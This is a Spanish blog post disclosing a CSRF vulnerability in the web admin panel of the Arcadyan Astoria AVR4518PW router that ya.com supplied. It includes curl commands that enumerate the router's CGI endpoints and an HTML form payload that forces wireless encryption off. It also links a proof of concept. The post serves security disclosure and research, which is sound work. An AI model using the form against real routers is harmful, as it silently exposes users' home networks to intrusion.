Title: CSRF en el panel de administración del router Arcadyan de ya.com
Date: 2011-01-01 18:46
Author: Nacho Cano
Tags: arcadyan, avr4518pw, csrf, router, ya.com
Slug: csrf-en-el-panel-de-administracion-del-router-arcadyan-de-ya-com

El router es un Arcadyan, modelo Astoria AVR4518PW. Y parece que es
vulnerable a ataques CSRF.

![Router Arcadyan]({static}/images/router-arcadyan-300x225.jpg)

Si tienes este router y has iniciado sesión en el panel de
administración, pulsando en el siguiente enlace se [cerrará la sesión de
usuario][]. Si has cambiado la IP por defecto, 192.168.2.1, no
funcionará, pero lo puedes probar escribiendo en la barra de direcciones
del navegador:

```javascript
javascript:document.location.href='http://192.168.2.1/cgi-bin/logout.exe'
```

**INCLUSO si lo haces desde un navegador distinto al que tengas abierta
la página de administración del _router_, o desde la consola!!!__ Por lo
que supongo que el router, una vez autenticado el usuario desde una IP,
autoriza cualquier petición que provenga desde esa IP.


El panel de administración web está compuesto de marcos, uno que
contiene el menú, otro que tiene la parte superior de la página y otro
en el que se carga la página de cada una de las secciones. Para ver
cuales son estas páginas, mientras hayamos iniciado sesión, podemos
inspeccionar el código fuente de la página del menú desde la consola.

```bash
$ curl http://192.168.2.1/menu.stm | grep -Eo [a-z_-]+.stm | sort
```

```bash
adsl_main.stm
adsl_para.stm
adsl_para.stm
adsl_status.stm
advanced_user_p.stm
arcor_network.stm
arcor_network.stm
atmpvc.stm
atmpvc_ya.stm
atmpvc_ya.stm
clone.stm
ddns_main.stm
ddns_main.stm
dns_proxy.stm
firewall_a.stm
firewall_d.stm
firewall_mac.stm
firewall_main.stm
firewall_rule.stm
firewall_spi_h.stm
firewall_u.stm
info_voip.stm
iptv_main.stm
lan_main.stm
menu.stm
nat_main.stm
nat_m.stm
nat_sp.stm
nat_v.stm
pin_code.stm
pingtest.stm
qos_clsmap.stm
qos_main.stm
qos_stats.stm
r_mort.stm
route_main.stm
route_tbl.stm
r_rip.stm
setup_dns.stm
setupw.stm
snmp_community.stm
snmp_main.stm
snmp_trap.stm
status_main.stm
system_c.stm
system_f.stm
system_main.stm
system_p.stm
system_remote_mgmt.stm
system_r.stm
system.stm
system_t.stm
telephony_voip.stm
tl_main.stm
upnp_main.stm
upnp_main.stm
usb_fsrv.stm
usb_ftp_server.stm
usb_main.stm
usb_modem.stm
usb_pr_server.stm
usb_wftp_server.stm
v_lan.stm
voip_account_ya.stm
voip_advanced.stm
voip_adv_port.stm
voip_call_allocation.stm
voip_call_allocation.stm
voip_dial.stm
voip_extension_out.stm
voip_extension.stm
voip_isdn_msn.stm
voip_main.stm
voip_numbers_act.stm
voip_numbers_act.stm
voip_num_plan.stm
voip_phone.stm
voip_quick_dial.stm
voip_sip.stm
voip_status.stm
wan_main.stm
wan_main.stm
wireless_e.stm
wireless_e.stm
wireless_id.stm
wireless_mac.stm
wireless_main.stm
wireless_wds.stm
```

Vamos a ver en cuáles de estas páginas se hacen llamadas a _scripts_,
como el que vimos antes. Debemos haber iniciado sesión para que funcione
lo siguiente:

```bash
$ for url in $(curl -s http://192.168.2.1/menu.stm | grep -Eo [a-z_-]+.stm | sort); do
     echo "En $url"
     curl -s http://192.168.2.1/$url | grep -Eo "/cgi-bin/[a-z_-]*\.exe";
  done
```

```bash
En adsl_main.stm
En adsl_para.stm
   /cgi-bin/aadsl.exe
En adsl_para.stm
   /cgi-bin/aadsl.exe
En adsl_status.stm
   /cgi-bin/setup_pass.exe
En advanced_user_p.stm
En arcor_network.stm
   /cgi-bin/arcor_network.exe
En arcor_network.stm
   /cgi-bin/arcor_network.exe
En atmpvc.stm
En atmpvc_ya.stm
   /cgi-bin/atmprofile.exe
En atmpvc_ya.stm
   /cgi-bin/atmprofile.exe
En clone.stm
   /cgi-bin/clMac.exe
En ddns_main.stm
   /cgi-bin/setup_ddns.exe
En ddns_main.stm
   /cgi-bin/setup_ddns.exe
En dns_proxy.stm
   /cgi-bin/dnsproxy_eb.exe
En firewall_a.stm
   /cgi-bin/aoaccdel.exe
   /cgi-bin/ac_control.exe
En firewall_d.stm
   /cgi-bin/setup_dmz.exe
En firewall_mac.stm
   /cgi-bin/macac_control.exe
En firewall_main.stm
   /cgi-bin/fire_eb.exe
En firewall_rule.stm
   /cgi-bin/aoschdel.exe
   /cgi-bin/setup_sch.exe
En firewall_spi_h.stm
   /cgi-bin/firewall_SPI.exe
En firewall_u.stm
   /cgi-bin/Aurlbk.exe
En info_voip.stm
En iptv_main.stm
   /cgi-bin/iptv_eb.exe
En lan_main.stm
   /cgi-bin/setup_lan.exe
   /cgi-bin/setup_lan.exe
En menu.stm
   /cgi-bin/nat_show.exe
En nat_main.stm
   /cgi-bin/nat_eb.exe
En nat_m.stm
   /cgi-bin/setup_fix_pat.exe
En nat_sp.stm
   /cgi-bin/nat_sp.exe
En nat_v.stm
   /cgi-bin/setup_virtualser.exe
En pin_code.stm
   /cgi-bin/setup_pincode.exe
En pingtest.stm
   /cgi-bin/ping_test.exe
En qos_clsmap.stm
En qos_main.stm
En qos_stats.stm
En r_mort.stm
En route_main.stm
En route_tbl.stm
   /cgi-bin/ArouteNew.exe
   /cgi-bin/ArouteNew.exe
En r_rip.stm
   /cgi-bin/Arip.exe
En setup_dns.stm
   /cgi-bin/setup_dns.exe
En setupw.stm
En snmp_community.stm
En snmp_main.stm
En snmp_trap.stm
En status_main.stm
   /cgi-bin/statusprocess.exe
   /cgi-bin/statusprocess.exe
En system_c.stm
   /cgi-bin/setup_config_data.exe
En system_f.stm
   /cgi-bin/upgrade.exe
En system_main.stm
   /cgi-bin/system_main.exe
En system_p.stm
   /cgi-bin/setup_pass.exe
En system_remote_mgmt.stm
   /cgi-bin/setup_remote_mgmt.exe
En system_r.stm
   /cgi-bin/restart.exe
En system.stm
En system_t.stm
   /cgi-bin/ntp_setting.exe
En telephony_voip.stm
   /cgi-bin/voip_acc_clr.exe
   /cgi-bin/voip_account.exe
En tl_main.stm
En upnp_main.stm
   /cgi-bin/upnp_eb.exe
En upnp_main.stm
   /cgi-bin/upnp_eb.exe
En usb_fsrv.stm
   /cgi-bin/setup_disk.exe
En usb_ftp_server.stm
   /cgi-bin/setup_ftp.exe
En usb_main.stm
   /cgi-bin/usb.exe
En usb_modem.stm
   /cgi-bin/usb_modem.exe
En usb_pr_server.stm
   /cgi-bin/setup_pr.exe
En usb_wftp_server.stm
   /cgi-bin/setup_wftp.exe
En v_lan.stm
   /cgi-bin/switch_vlan_delete.exe
   /cgi-bin/switch_vlan_delete.exe
   /cgi-bin/switch_vlan_delete.exe
En voip_account_ya.stm
   /cgi-bin/voip_account_edit.exe
En voip_advanced.stm
En voip_adv_port.stm
En voip_call_allocation.stm
   /cgi-bin/voip-call-allocation.exe
En voip_call_allocation.stm
   /cgi-bin/voip-call-allocation.exe
En voip_dial.stm
En voip_extension_out.stm
   /cgi-bin/voip-ext-out.exe
En voip_extension.stm
En voip_isdn_msn.stm
   /cgi-bin/voip-isdn-msn.exe
En voip_main.stm
En voip_numbers_act.stm
   /cgi-bin/voip-call-out.exe
En voip_numbers_act.stm
   /cgi-bin/voip-call-out.exe
En voip_num_plan.stm
En voip_phone.stm
   /cgi-bin/voip-phone.exe
En voip_quick_dial.stm
En voip_sip.stm
En voip_status.stm
   /cgi-bin/del_call_log.exe
En wan_main.stm
   /cgi-bin/setup_wan.exe
En wan_main.stm
   /cgi-bin/setup_wan.exe
En wireless_e.stm
   /cgi-bin/wps_set.exe
   /cgi-bin/wireless_e.exe
   /cgi-bin/wireless_wep.exe
   /cgi-bin/wireless_wpa.exe
En wireless_e.stm
   /cgi-bin/wps_set.exe
   /cgi-bin/wireless_e.exe
   /cgi-bin/wireless_wep.exe
   /cgi-bin/wireless_wpa.exe
En wireless_id.stm
   /cgi-bin/wireless_ssid.exe
En wireless_mac.stm
   /cgi-bin/add_cur_mac.exe
   /cgi-bin/wireless_f.exe
En wireless_main.stm
   /cgi-bin/wireless_eb.exe
En wireless_wds.stm
   /cgi-bin/wireless_wds.exe
```

Faltan los del menú superior:

```bash
$ curl http://192.168.2.1/setupa_top.stm | grep -Eo "/cgi-bin/[a-z_-]*\.exe"
/cgi-bin/logout.exe
/cgi-bin/change_language.exe
```

Una de las primeras cosas que he probado es que es posible deshabilitar
el cifrado para la red inalámbrica. Si creamos un formulario como este:

```html
<form action="http://192.168.2.1/cgi-bin/wireless_e.exe" method="post">
    <input type="text" name="changewep" value="0">
    <input type="text" name="client_type" value="0">
    <input type="text" name="wpa_authen" value="0">
    <input type="text" name="do_submit" value="1">
    <input type="text" name="wps_enable">
    <input type="text" name="vap" value="0">
    <input type="text" name="cur_vap" value="0">
    <input type="text" name="securitytype" value="2">
    <input type="submit" value="submit">
</form>
```

El campo `cur_vap` se refiere al punto de acceso inalámbrico; el router
permite tener dos. Y el campo `securitytype` se refiere al tipo de
cifrado que queremos. Los valores que puede tomar este campo son:

|`securitytype`| Tipo de cifrado|
|--------------|----------------|
| 0            |   WPA/WPA2     |
| 1            |   WEP          |
| 2            |   Deshabilitado|
| 3            |   Sólo WPA     |
| 4            |   Sólo WPA2    |

En función del tipo de cifrado, tendremos que utilizar otros campos y
otros `action` para el formulario.

Aquí hay una [prueba de concepto][], aunque el `action` del formulario
tiene la IP por defecto del router, 192.168.2.1.

  [cerrará la sesión de usuario]: #
    "cerrará la sesión de usuario"
  [prueba de concepto]: http://terminus.ignaciocano.com/index/router-arcadyan-csrf.php
    "prueba de concepto"
